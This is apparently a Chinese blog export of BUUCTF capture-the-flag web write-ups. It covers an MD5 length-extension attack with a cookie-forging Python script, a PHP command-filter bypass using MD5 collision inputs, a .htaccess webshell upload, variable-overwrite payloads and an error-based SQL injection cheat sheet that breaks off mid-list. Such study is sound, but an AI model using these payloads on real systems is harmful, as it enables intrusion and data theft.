<p>简单说下md5算法,分为md5 padding和md5 compress</p>
<figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>对输入的一串字符进行md5 padding后,如果这串字符的字节长度对64求余结果不为56,就会填充一个x80和xx个0使得对64求余的结果等于56,此时字符串的字节长度为n*64+56,并且最后8个字节用来记录原始输入信息长度</p>
<p>例如对admin进行md5 padding处理后为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure>
<p>61646d696e  为admin的hex<br>80  为第一个填充块,后面的一大串0也是填充</p>
<p>2800000000000000  实际值为0000000000000028,十进制的40,单位为bit,为5个字节(admin)</p>
<p>md5算法里有四个向量(Magic number)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</span><br></pre></td></tr></table></figure>
<p>初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法,压缩算法完成后会产生新的4个Magic number,再进行第二个64字节Message block的md5 compress压缩算法,直到压缩到最后64个字节的(Message block + padding),最后得到的Magic number经过hex转化就是最后的md5 hash值<br>所以当已知 md5(salt+message)的值 message内容 salt+message长度 时,就可以在不知道salt的具体内容情况下计算出任意的md5(salt+message+padding+append)值,逆向出最后一次的4个Magic number<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">大佬的攻击脚本</a></p>
<p>回归正题</p>
<p>geneSign里的request.args.get()方法可以用来请求上下文,即可以用来读取文件内容,先读取一下flag.txt,获得一串md5,是md5(secert_key + ‘flag.txt’ + ‘scan’) 的值,而我们需要的是获取 md5(secert_key + ‘flag.txt’ + ‘readscan’) 的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txt</span><br><span class="line">62bc8d3947680a751bfb41f9e69631d9</span><br></pre></td></tr></table></figure>
<p>使用hashpump工具进行哈希长度扩展攻击<br><figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02093a8c2c49c37477f5053717930316</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
<p>需要在执行前把转义字符\x变成%然后将这两串传入cookie,脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn/De1ta?param=flag.txt&apos;</span><br><span class="line">cookies = &#123;</span><br><span class="line">  &apos;sign&apos;: &apos;02093a8c2c49c37477f5053717930316&apos;,</span><br><span class="line">  &apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,</span><br><span class="line">  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
<p>收到回复信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 hashcookie.py</span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;40fac20a-bded-4216-889f-ac089966e6d4&#125;\n&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="方法二-字符串拼接"><a href="#方法二-字符串拼接" class="headerlink" title="方法二:字符串拼接"></a>方法二:字符串拼接</h3><p>后两种方法是看大佬博客的,跟着复现学一波</p>
<p>geneSign里的param在方法定义里只有scan的功能,要想实现readscan可以根据python里对md5()方法里参数的拼接,采用字符串拼接的形式,看一下这两块的逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>在访问/geneSign?param=flag.txt的时候,返回的数据应该是 md5(‘secert_key’ + ‘flag.txt’ + ‘scan’)<br>在md5()方法里相当于 md5(secert_keyflag.txtscan)</p>
<p>所以当我们传入的数据为 /geneSign?param=flag.txtread 时就拼接出了md5(‘secert_keyflag.txtreadscan’),直接获取到cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">cb6a31cfc19b4162449c235bac8251b7</span><br></pre></td></tr></table></figure>
<p>接着抓包访问 /De1ta?param=flag.txt 构造cookie<br>action=readscan;sign=cb6a31cfc19b4162449c235bac8251b7</p>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{40fac20a-bded-4216-889f-ac089966e6d4}</p>
<h3 id="方法三-local-file"><a href="#方法三-local-file" class="headerlink" title="方法三:local_file"></a>方法三:local_file</h3><p>和第二种方法类似,但在文件内容读取上用了local_file函数,与之相关的是CVE-2019-9948,存在不必要的URL方案以允许local_file://读取urllib中的文件</p>
<p>进行读取的话,flag.txt的路径是 local_file:///app/flag.txt,其余步骤与方法二相似</p>
<p>这里是使用的 urllib.urlopen(param) 去包含的文件,所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问,也可以使用类似的 file:///app/flag.txt 去访问,但是 file 关键字在黑名单里,可以使用 local_file 代替,​ 如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ,否则会报 ValueError: unknown url type: /path/to/file 的错误.</p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">http://0</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">e8b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">ac</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">5e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">a39d</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-418</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">f-9</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">6e</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">-52</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">7</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">4</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">96</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">c</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">2ba0b</a><a href="http://0e8bac5e-a39d-418f-946e-527496c2ba0b.node3.buuoj.cn" target="_blank" rel="noopener">.node3.buuoj.cn</a></p>
<p>查看源码,有一句提示 md5 is funny ~</p>
<p>观察url的变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line">对img进行base64解码</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">再解一次</span><br><span class="line">3535352e706e67</span><br><span class="line">解一次hex</span><br><span class="line">555.png</span><br></pre></td></tr></table></figure>
<p>猜测能进行文件读取,构造index.php查下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>对图片里的base64进行解密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$img对文件进行base64源码读取</span></span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">//对$cmd进行了过滤,但过滤反斜杠 |\\|\\\\| 正则没有写好,可导致反斜杠逃逸</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="comment">//md5强类型比较,需要md5碰撞</span></span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>对于本题php反斜杠的正则 |\|\\| 形成的反斜杠逃逸,可以解析一下过程</p>
<ol>
<li>\ 先经过PHP正则解析器为一个\</li>
<li>\ 又跟’|’结合到一起,从而在正则表达式的解析器解析为|</li>
<li>又因为’|’是正则中的保留符号,所以需要一个转义符来转义.所以\|这个的结果就是匹配 ‘|’</li>
<li>后面又跟了\\,这里先经过PHP正则解析器为 \,然后在经过正则表达式的解析器为 ‘\’</li>
<li>最后的正则表达式就是匹配’|\’而不是’|’和’\’,形成反斜杠逃逸</li>
</ol>
<p>根据分析构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%20/flag</span><br></pre></td></tr></table></figure>
<p>在md5里有一些md5串编码不同但值相同,就可以用来碰撞绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>需要抓包改成post传参<br><figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>flag{5e4e259d-460a-4ca9-ab42-9641bf7f9179}</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><a href="http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn" target="_blank" rel="noopener">http://434077c3-498f-4c11-a729-f0163dbfb84f.node3.buuoj.cn</a></p>
<p>尝试上传一句话图片马,提示说后缀名不能有ph</p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>那就上传.htaccess</p>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>再把图片上传</p>
<figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>蚁剑连上</p>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{4d82a478-0cbd-41f0-ab29-ae2d943d8705}</p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><a href="http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn" target="_blank" rel="noopener">http://75fc63bc-7ecb-4732-a3f9-26b5dea705f6.node3.buuoj.cn</a></p>
<p>页面没啥利用点,我的扫描器经常扫不到.git,还是用自己的脚本扫下目录</p>
<figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>一堆弱相应,但存在.git,用githack恢复,看到有flag.php文件,但没恢复出来</p>
<figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>以前做题好像也有这种情况,翻了翻以前的<a href="http://www.damyahome.top/8307%E5%92%8C8302%E9%9D%B6%E5%9C%BAweb%E9%A2%98wp/" target="_blank" rel="noopener">文章</a></p>
<p>尝试用gittool工具里的Dumper和Extractor获得完整源码,失败</p>
<p>奇怪了就是恢复不过来,我换靶机也恢复不过来,只能看着别人博客的源码</p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"><span class="comment">//flag.php只起到一个输出作用</span></span><br></pre></td></tr></table></figure>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//html略</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//支持get和post传参的数组遍历</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还加了三层过滤规则</span></span><br><span class="line"><span class="comment">//1.不管是get还是post,flag都不能等于flag,否则退出</span></span><br><span class="line"><span class="comment">//2.检测get或post是否有flag,没有则退出</span></span><br><span class="line"><span class="comment">//3.如果get的flag不等于flag,退出</span></span><br><span class="line"><span class="comment">//也就是要求get的flag=flag,但不能post或者get的flag=flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure></p>
<p>看一下foreach函数,在不改变flag的情况下exit()也能作为输出,本题的思路就是变量覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach</span><br><span class="line">(PHP 4, PHP 5, PHP 7)</span><br><span class="line">foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</span><br><span class="line">第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。</span><br></pre></td></tr></table></figure></p>
<h3 id="方法一-GET"><a href="#方法一-GET" class="headerlink" title="方法一:GET"></a>方法一:GET</h3><p>get里只要能构成变量覆盖,用$yds或$is都行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果是yds=flag<br>$x=yds,$y=flag,所以$$x=$yds,$$y=$flag</p>
<p>$$x = $$y,也就是$yds=$flag</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yds=flag</span><br></pre></td></tr></table></figure>
<p>如果是is=flag<br>$x=is,$y=flag,所以$$x=$is,$$y=$flag</p>
<p>$$x = $$y,也就是$is=$flag</p>
<p>又因为要求flag=flag,所以$x=flag,$y=flag,带进去变成$flag=$flag</p>
<p>将两种情况连接起来</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{64be7429-88b0-4318-8e17-3a7efb7a540a}</p>
<h3 id="方法二-GET-POST"><a href="#方法二-GET-POST" class="headerlink" title="方法二:GET+POST"></a>方法二:GET+POST</h3><p>在post里也可以进行一次变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">$$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要post一个等式使得执行后为$$flag=$flag,即$flag=flag<br>然后get传参为yds=flag,详细看方法一</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">yds=flag</span><br><span class="line">POST:</span><br><span class="line">$flag=flag</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF web练习4]]></title>
      <url>/ctf-writeup-web/ckwd5ws7i001xd0ucidmrka8q/</url>
      <content type="html"><![CDATA[<p>web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧</p>
<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="BUUCTF_web练习4.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL报错注入小结]]></title>
      <url>/web%E5%AD%A6%E4%B9%A0/ckwd5ws8h003gd0ucnc00c7gk/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前阵子看我以前的文章</p>
<p><a href="http://www.damyahome.top/%E4%B8%80%E4%BA%9B%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9A%84web%E9%A2%98wp/" target="_blank" rel="noopener">http://www.damyahome.top/%E4%B8%80%E4%BA%9B%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9A%84web%E9%A2%98wp/</a></p>
<p>有写有十种报错注入的方式,然后觉得自己还没理解透,所以小结梳理一下.</p>
<p>只分析常用的三种,其他都可以举一反三.</p>
<h2 id="十种报错注入"><a href="#十种报错注入" class="headerlink" title="十种报错注入"></a>十种报错注入</h2><p>资料来自:</p>
<p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
<ol>
<li><p>floor()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
</li>
<li><p>extractvalue()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
</li>
<li><p>updatexml()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
</li>
<li><p>geometrycollection()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
</li>
<li><p>multipoint()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
</li>
<li><p>polygon()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
</li>
<li><p>multipolygon()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
</li>
<li><p>linestring()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
</li>
<li><p>multilinestring()</p>
